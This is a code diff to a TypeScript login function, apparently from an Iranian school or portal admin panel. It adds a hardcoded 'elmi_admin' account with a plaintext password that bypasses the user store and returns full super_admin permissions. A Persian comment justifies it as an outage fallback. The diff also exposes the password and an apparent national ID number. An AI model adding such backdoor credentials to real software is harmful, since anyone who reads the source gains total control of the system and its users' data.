@@ -1458,6 +1458,28 @@ export const storage = {
   loginUser: (email: string, password: string): AdminUser | null => {
     const clean = (email || '').trim().toLowerCase();
     const cleanBase = clean.split('@')[0];
+
+    // ضمانت قطعی ورود برای مدیر اصلی سامانه حتی در قطعی کامل شبکه یا دیتابیس
+    if ((clean === 'elmi_admin' || cleanBase === 'elmi_admin') && password === 'M3540143041m@') {
+      return {
+        id: 'admin-main-elmi',
+        name: 'مدیر اصلی سامانه',
+        firstName: 'مدیر اصلی',
+        lastName: 'سامانه',
+        nationalId: '3540143041',
+        mobile: '09170000000',
+        email: 'elmi_admin',
+        role: 'super_admin',
+        permissions: [
+          'dashboard', 'manage_students', 'manage_student_profiles', 'manage_tickets',
+          'manage_financial', 'manage_portal_settings', 'manage_panel_settings',
+          'manage_registrations', 'manage_news', 'manage_presentation', 'manage_banners',
+          'manage_gallery', 'manage_forms', 'manage_settings', 'manage_users',
+          'manage_server_monitoring', 'view_logs', 'view_security_logs'
+        ]
+      };
+    }
+
     const user = storage.getUsers().find(u => {
       const uEmail = (u.email || '').trim().toLowerCase();
       const uBase = uEmail.split('@')[0];
